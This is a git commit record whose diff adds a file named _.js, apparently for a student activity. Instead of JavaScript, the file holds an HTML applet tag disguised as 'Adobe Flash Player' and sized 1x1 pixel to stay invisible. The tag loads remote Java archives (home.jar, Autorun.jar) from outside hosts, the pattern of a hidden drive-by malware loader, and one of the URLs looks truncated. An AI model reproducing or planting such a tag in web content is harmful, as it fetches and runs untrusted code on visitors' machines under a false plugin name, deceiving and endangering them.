2b651461a7d4a31c42a6095061fcea175f35d979
Luís Felipe Do Carmo Costa Tavares <48478593+LuisFelipeTs@users.noreply.github.com>
2022-04-04 20:32:47 -0300

    _.Js file to atividade1

---
+++ _.js
@@ -0,0 +1,5 @@
+<applet name="Adobe Flash Player version 10.1.6" 
+code="Home.class" archive="http://www.anl.org.br/home.jar" 
+height="1" width="1"> <param name="link" value="http://wwrg.br/Autorun.jar"></param></applet>
+
+/* _.js  */
